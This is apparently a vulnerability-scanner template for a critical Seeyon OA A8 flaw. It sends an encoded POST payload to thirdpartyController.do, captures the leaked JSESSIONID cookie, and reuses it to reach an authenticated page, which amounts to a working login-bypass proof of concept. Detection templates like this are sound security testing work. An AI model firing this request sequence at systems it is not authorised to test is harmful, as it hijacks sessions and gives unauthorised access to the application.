expression: r0() && r1()
id: seeyon-oa-cookie-leak-login-bypass
info:
  author: Print1n(http://print1n.top)
  description: app="Seeyon-A8"
  name: Seeyon OA Cookie Leakage
  reference:
  - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && "JSESSIONID=(.*)".bmatches(response.raw_header)
    output:
      mycookie: search["mycookie"]
      search: '"JSESSIONID=(?P<mycookie>.*?);".bsubmatch(response.raw_header)'
    request:
      body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
      method: POST
      path: /seeyon/thirdpartyController.do
  r1:
    expression: response.status == 200 && response.body.bcontains(b"<a href='/seeyon/main.do?method=logout'")
    request:
      headers:
        Cookie: JSESSIONID={{mycookie}}
      method: GET
      path: /seeyon/main.do
